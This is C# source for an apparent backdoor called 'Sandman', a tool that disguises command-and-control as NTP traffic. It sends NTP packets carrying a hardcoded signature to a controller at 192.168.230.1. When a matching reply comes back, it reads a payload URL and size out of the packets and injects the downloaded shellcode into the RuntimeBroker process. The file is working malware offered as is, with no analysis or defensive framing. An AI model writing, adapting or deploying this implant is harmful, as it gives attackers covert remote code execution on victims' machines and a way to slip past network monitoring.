using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Sandman
{
    internal class Program
    {
        private const int defaultNtpMessageSize = 48;
        // private const string ntpServer = "time.windows.com";
        private const string ntpServer = "192.168.230.1";
        private const int ntpPort = 123;
        private const int timeout = 5000;
        private const int sleep = 2000;
        private static bool keepRunning = true;

        static void Main(string[] args) {
            IPAddress ntpServerAddress;
            var signature = new byte[] { 0x49, 0x44, 0x4f, 0x56, 0x33, 0x31 };

            // If using a DNS name: Getting the ip address.
            if (!IPAddress.TryParse(ntpServer, out ntpServerAddress))
            {
                ntpServerAddress = Dns.GetHostEntry(ntpServer).AddressList[0];
            }
            var ipEndPoint = new IPEndPoint(ntpServerAddress, ntpPort);
            
            while (keepRunning)
            {
                CheckIn(ipEndPoint, signature);
                Thread.Sleep(sleep);
            }
        }

        static void CheckIn(IPEndPoint ipEndPoint, byte[] signature)
        {
            var ntpData = new byte[defaultNtpMessageSize];
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            // A required value for legit NTP packet.
            ntpData[0] = 0x1B;

            // Adding the malicious signature.
            Array.Copy(signature, 0, ntpData, 1, 6);

            // Sending a request.
            try
            {
                socket.Connect(ipEndPoint);
                socket.ReceiveTimeout = timeout;
                socket.Send(ntpData);
                socket.Receive(ntpData);

                // If a waking call found - download & execute the payload.
                if (signature.All(x => ntpData.Contains(x)))
                {
                    int amountOfPackets = 0;
                    string data = "";
                    string payloadUrl = "";
                    string szPayloadSize = "";
                    int payloadSize = 0;

                    for (int i = signature.Length + 1; i < ntpData.Length; i++)
                    {
                        if (ntpData[i] == 0x00)
                            break;
                        data += (char)ntpData[i];
                    }

                    if (int.TryParse(data, out amountOfPackets))
                    {
                        for (int i = 0; i < amountOfPackets; i++)
                        {
                            socket.Receive(ntpData);

                            for (int j = signature.Length + 1; j < ntpData.Length; j++)
                            {
                                if (ntpData[j] == 0x00)
                                    break;
                                payloadUrl += (char)ntpData[j];
                            }
                        }
                    }
                    else
                        payloadUrl = data;

                    // Getting and validating the payload size.
                    socket.Receive(ntpData);
                    
                    for (int i = signature.Length + 1; i < ntpData.Length; i++)
                    {
                        if (ntpData[i] == 0x00)
                            break;
                        szPayloadSize += (char)ntpData[i];
                    }
                    
                    if (!int.TryParse(szPayloadSize, out payloadSize))
                        return;

                    // Injecting and executing the shellcode.
                    if (Injector.InjectShellcode(payloadUrl, payloadSize, "RuntimeBroker"))
                        keepRunning = false;
                }
            }
            catch (SocketException)
            { }
            finally
            {
                if (socket.Connected)
                {
                    socket.Close();
                }
            }
        }
    }
}
